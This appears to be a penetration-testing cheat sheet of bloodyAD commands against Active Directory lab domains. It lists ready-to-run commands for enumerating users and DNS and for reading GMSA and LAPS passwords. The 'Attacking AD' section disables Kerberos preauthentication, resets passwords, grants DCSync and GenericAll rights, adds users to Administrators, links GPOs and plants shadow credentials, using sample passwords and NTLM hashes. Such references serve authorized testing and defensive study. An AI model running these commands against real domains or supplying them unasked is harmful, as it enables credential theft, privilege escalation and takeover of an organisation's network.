## Enumerating using bloodyAD
```sh
# Get group members
bloodyAD -k --host "$DC" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --dc-ip "$IP" get object Users --attr member 

# Get minimum password length policy
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" get object 'DC=bloody,DC=local' --attr minPwdLength

# Get AD functional level
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" get object 'DC=bloody,DC=local' --attr msDS-Behavior-Version

# Get all users of the domain
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" get children 'DC=bloody,DC=local' --type user

# Get all computers of the domain
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" get children 'DC=bloody,DC=local' --type computer

# Get all containers of the domain
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" get children 'DC=bloody,DC=local' --type container

# Get UserAccountControl flags
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" get object john.doe --attr userAccountControl

# Get AD DNS records
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" get dnsDump

# Get user
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p ":$HASH" --dc-ip "$IP" get object administrator

# Get member of group
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p ":$HASH" --dc-ip "$IP" get object 'Domain Admins'

# Read GMSA account password
bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword

# Read LAPS password
bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'COMPUTER$' --attr ms-Mcs-AdmPwd

# Read quota for adding computer objects to domain
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr ms-DS-MachineAccountQuota
```


## Attacking AD using bloodyAD
```sh
# Enable DONT_REQ_PREAUTH for ASREPRoast
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 add uac john.doe DONT_REQ_PREAUTH

# Trusted for Delegatoin
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 add uac TRUSTED_FOR_DELEGATION computer

# Disable ACCOUNTDISABLE
bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'PUPPY.HTB' --dc-ip 10.10.11.70 remove uac 'adam.silver' -f ACCOUNTDISABLE

# Add a new DNS entry
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 add dnsRecord my_machine_name 192.168.10.48

# Remove a DNS entry
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 remove dnsRecord my_machine_name 192.168.10.48

# Set password for user
bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :70016778cb0524c799ac25b439bd6a31 set password 'targetuser' 'newpassword'

# Add dcsync to object
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add dcsync administrator

# Add GenericAll to object
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add genericAll MS01$ administrator

# Add user to group
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add groupMember 'Administrators' test

# Remove user from group
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p ":$HASH" --dc-ip "$IP" remove groupMember 'Protected Objects' 'IT'

# Linking GPO
bloodyAD -d powercorp.local --host 10.10.1.128 -u incendium -p Incendium123 set object SRV01$ GPLink -v CN={2AADC2C9-C75F-45EF-A002-A22E1893FDB5},CN=POLICIES,CN=SYSTEM,DC=POWERCORP,DC=LOCAL

# Shadow credentials
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p ":$HASH" --dc-ip "$IP" add shadowCredentials targetpc$
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p ":$HASH" --dc-ip "$IP" remove shadowCredentials targetpc$ --key <key from previous output>

# Search for same user if he have write on OUs.
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" get writable --otype OU

# Change UPN of a user
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" set object $target userPrincipalName -v $new_upn
```

